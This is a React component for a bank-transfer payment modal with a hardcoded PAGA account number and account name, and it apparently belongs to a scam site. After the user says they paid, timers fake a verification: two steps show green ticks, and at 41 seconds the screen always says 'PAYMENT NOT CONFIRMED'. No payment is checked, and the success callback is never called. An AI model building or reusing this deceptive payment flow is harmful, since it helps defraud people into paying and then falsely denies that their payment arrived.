"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Check, X, Eye, EyeOff } from "lucide-react"

interface BankTransferModalProps {
  isOpen: boolean
  onClose: () => void
  userEmail: string
  amount: number
  planName: string
  onPaymentConfirmed: () => void
}

export default function BankTransferModal({
  isOpen,
  onClose,
  userEmail,
  amount,
  planName,
  onPaymentConfirmed,
}: BankTransferModalProps) {
  const [copiedAmount, setCopiedAmount] = useState(false)
  const [copiedAccount, setCopiedAccount] = useState(false)
  const [isConfirming, setIsConfirming] = useState(false)
  const [paymentMadeConfirmed, setPaymentMadeConfirmed] = useState(false)
  const [confirmingPaymentConfirmed, setConfirmingPaymentConfirmed] = useState(false)
  const [showPaymentNotConfirmed, setShowPaymentNotConfirmed] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [passcode, setPasscode] = useState("")

  const bankDetails = {
    amount: `NGN ${amount.toLocaleString()}`,
    accountNumber: "3211850611",
    bankName: "PAGA",
    accountName: "CASHTUBE AGENT -TERHILE",
  }

  const handleCopy = (text: string, type: "amount" | "account") => {
    navigator.clipboard.writeText(text).then(() => {
      if (type === "amount") {
        setCopiedAmount(true)
        setTimeout(() => setCopiedAmount(false), 2000)
      } else if (type === "account") {
        setCopiedAccount(true)
        setTimeout(() => setCopiedAccount(false), 2000)
      }
    })
  }

  const handlePaymentConfirmation = () => {
    setIsConfirming(true)

    // After 30 seconds, mark payment as made
    setTimeout(() => {
      setPaymentMadeConfirmed(true)
    }, 30000)

    // After 40 seconds, mark confirming payment as confirmed
    setTimeout(() => {
      setConfirmingPaymentConfirmed(true)
    }, 40000)

    // After 41 seconds, show payment not confirmed screen
    setTimeout(() => {
      setShowPaymentNotConfirmed(true)
      setIsConfirming(false)
    }, 41000)
  }

  // Reset states when modal closes
  useEffect(() => {
    if (!isOpen) {
      setIsConfirming(false)
      setPaymentMadeConfirmed(false)
      setConfirmingPaymentConfirmed(false)
      setShowPaymentNotConfirmed(false)
      setPasscode("")
      setShowPassword(false)
    }
  }, [isOpen])

  if (!isOpen) return null

  // Show payment not confirmed screen
  if (showPaymentNotConfirmed) {
    return (
      <div className="fixed inset-0 bg-white z-[70] overflow-y-auto">
        {/* Header */}
        <div className="flex justify-between items-center p-3 border-b border-gray-200">
          <h1 className="text-lg font-semibold text-gray-800">Bank Transfer</h1>
          <Button onClick={onClose} variant="ghost" className="text-red-500 hover:text-red-600 font-medium text-sm">
            Cancel
          </Button>
        </div>

        {/* Main Content */}
        <div className="p-3 max-w-sm mx-auto">
          {/* Amount and Logo Section */}
          <div className="flex justify-between items-start mb-6">
            <div className="w-12 h-12 bg-indigo-800 rounded-full flex items-center justify-center">
              <div className="text-white text-lg font-semibold">₦</div>
            </div>
            <div className="text-right">
              <p className="text-xl font-semibold text-gray-800">{bankDetails.amount}</p>
              <p className="text-xs text-gray-600 mt-1 font-medium">{userEmail}</p>
            </div>
          </div>

          {/* Instructions */}
          <div className="text-center mb-8">
            <p className="text-sm text-gray-800 font-medium mb-6">Proceed to your bank app to complete this Transfer</p>

            {/* Large Red X Circle */}
            <div className="flex justify-center mb-6">
              <div className="w-32 h-32 bg-red-500 rounded-full flex items-center justify-center shadow-lg">
                <X className="h-16 w-16 text-white stroke-[3]" />
              </div>
            </div>

            {/* Error Message */}
            <h2 className="text-lg font-semibold text-orange-500 mb-4">PAYMENT NOT CONFIRMED!</h2>

            <p className="text-gray-700 font-medium text-sm mb-6">
              Your payment wasn't confirmed. contact us on email for help
            </p>

            {/* Passcode Input */}
            <div className="relative">
              <Input
                type="text"
                value={showPassword ? "FEE NOT CONFIRMED" : "••••••••••••••••"}
                readOnly
                className="w-full h-10 text-sm font-medium border border-gray-300 rounded-md px-3 pr-10 text-center"
              />
              <Button
                type="button"
                variant="ghost"
                size="icon"
                className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 h-6 w-6"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              </Button>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // Show confirmation screen
  if (isConfirming) {
    return (
      <div className="fixed inset-0 bg-white z-[70] overflow-y-auto">
        {/* Header */}
        <div className="flex justify-between items-center p-3 border-b border-gray-200">
          <h1 className="text-lg font-semibold text-gray-800">Bank Transfer</h1>
          <Button onClick={onClose} variant="ghost" className="text-red-500 hover:text-red-600 font-medium text-sm">
            Cancel
          </Button>
        </div>

        {/* Main Content */}
        <div className="p-3 max-w-sm mx-auto">
          {/* Amount and Logo Section */}
          <div className="flex justify-between items-start mb-6">
            <div className="w-12 h-12 bg-indigo-800 rounded-full flex items-center justify-center">
              <div className="text-white text-lg font-semibold">₦</div>
            </div>
            <div className="text-right">
              <p className="text-xl font-semibold text-gray-800">{bankDetails.amount}</p>
              <p className="text-xs text-gray-600 mt-1 font-medium">{userEmail}</p>
            </div>
          </div>

          {/* Instructions */}
          <div className="text-center mb-8">
            <p className="text-sm text-gray-800 font-medium mb-6">Proceed to your bank app to complete this Transfer</p>

            {/* Main Loading Spinner */}
            <div className="flex justify-center mb-4">
              <div className="w-12 h-12 border-4 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
            </div>

            <p className="text-gray-700 font-medium text-sm">Wait while we confirm your payment...</p>
          </div>

          {/* Status Cards */}
          <div className="space-y-3">
            {/* Payment Made Status */}
            <div className="bg-gray-100 rounded-lg p-3 flex justify-between items-center">
              <span className="text-gray-800 font-medium text-sm">Payment Made</span>
              <div className="flex items-center">
                {paymentMadeConfirmed ? (
                  <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                    <Check className="h-4 w-4 text-white" />
                  </div>
                ) : (
                  <div className="w-6 h-6 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
                )}
              </div>
            </div>

            {/* Confirming Payment Status */}
            <div className="bg-gray-100 rounded-lg p-3 flex justify-between items-center">
              <span className="text-gray-800 font-medium text-sm">Confirming Payment</span>
              <div className="flex items-center">
                {confirmingPaymentConfirmed ? (
                  <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                    <Check className="h-4 w-4 text-white" />
                  </div>
                ) : (
                  <div className="w-6 h-6 border-2 border-yellow-400 border-t-transparent rounded-full animate-spin"></div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // Show normal bank transfer form
  return (
    <div className="fixed inset-0 bg-white z-[70] overflow-y-auto">
      {/* Header */}
      <div className="flex justify-between items-center p-3 border-b border-gray-200">
        <div className="flex flex-col">
          <h1 className="text-lg font-semibold text-gray-800">Bank Transfer</h1>
          <span className="text-xs text-gray-600 font-medium">{userEmail}</span>
        </div>
        <Button onClick={onClose} variant="ghost" className="text-red-500 hover:text-red-600 font-medium text-sm">
          Cancel
        </Button>
      </div>

      {/* Main Content */}
      <div className="p-3 max-w-sm mx-auto">
        {/* Amount and Logo Section */}
        <div className="flex justify-between items-start mb-6">
          <div className="w-12 h-12 bg-indigo-800 rounded-full flex items-center justify-center">
            <div className="text-white text-lg font-semibold">₦</div>
          </div>
          <div className="text-right">
            <p className="text-xl font-semibold text-gray-800">{bankDetails.amount}</p>
            <p className="text-xs text-gray-600 mt-1 font-medium">{userEmail}</p>
          </div>
        </div>

        {/* Instructions */}
        <div className="text-center mb-6">
          <p className="text-sm text-gray-800 font-medium mb-2">Proceed to your bank app to complete this Transfer</p>
          <p className="text-lg font-bold text-red-600 mb-2">DO NOT USE OPAY TO MAKE PAYMENT</p>
        </div>

        {/* Bank Details Card */}
        <div className="border border-gray-300 rounded-lg p-4 mb-4 bg-gray-50 shadow-sm">
          {/* Amount */}
          <div className="flex justify-between items-center mb-3 pb-3 border-b border-gray-200">
            <div>
              <p className="text-xs text-gray-600 font-medium">Amount</p>
              <p className="text-lg font-semibold text-gray-800">{bankDetails.amount}</p>
            </div>
            <Button
              onClick={() => handleCopy(amount.toString(), "amount")}
              className="bg-orange-500 hover:bg-orange-600 text-white px-3 py-1 rounded-md text-xs font-medium"
            >
              {copiedAmount ? "Copied!" : "Copy"}
            </Button>
          </div>

          {/* Account Number */}
          <div className="flex justify-between items-center mb-3 pb-3 border-b border-gray-200">
            <div>
              <p className="text-xs text-gray-600 font-medium">Account Number</p>
              <p className="text-lg font-semibold text-gray-800">{bankDetails.accountNumber}</p>
            </div>
            <Button
              onClick={() => handleCopy(bankDetails.accountNumber, "account")}
              className="bg-orange-500 hover:bg-orange-600 text-white px-3 py-1 rounded-md text-xs font-medium"
            >
              {copiedAccount ? "Copied!" : "Copy"}
            </Button>
          </div>

          {/* Bank Name */}
          <div className="mb-3 pb-3 border-b border-gray-200">
            <p className="text-xs text-gray-600 font-medium">Bank Name</p>
            <p className="text-lg font-semibold text-gray-800">{bankDetails.bankName}</p>
          </div>

          {/* Account Name */}
          <div>
            <p className="text-xs text-gray-600 font-medium">Account Name</p>
            <p className="text-lg font-semibold text-gray-800">{bankDetails.accountName}</p>
          </div>
        </div>

        {/* Bottom Instructions */}
        <div className="text-center mb-4">
          <p className="text-gray-700 font-medium text-sm">Pay to this specific account and get your access code</p>
        </div>

        {/* Confirmation Button */}
        <Button
          onClick={handlePaymentConfirmation}
          className="w-full bg-orange-500 hover:bg-orange-600 text-white py-3 text-sm font-medium rounded-lg shadow-sm"
        >
          I have made this bank payment
        </Button>
      </div>
    </div>
  )
}
